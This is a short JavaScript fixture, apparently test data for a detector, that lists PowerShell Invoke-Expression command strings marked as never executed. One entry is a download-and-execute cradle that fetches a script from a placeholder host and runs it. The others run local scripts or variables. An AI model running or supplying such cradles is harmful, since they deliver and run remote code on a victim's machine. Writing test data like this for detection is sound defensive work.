// Embedded command fixtures: never executed.
const commands = [
    'IEX $payload',
    'Invoke-Expression $payload',
    'IEX (New-Object Net.WebClient).DownloadString("https://example.invalid/a")',
    'iex Get-Content stage.ps1',
    'IEX C:\\stage.ps1',
    'iex "Get-Process"'
];
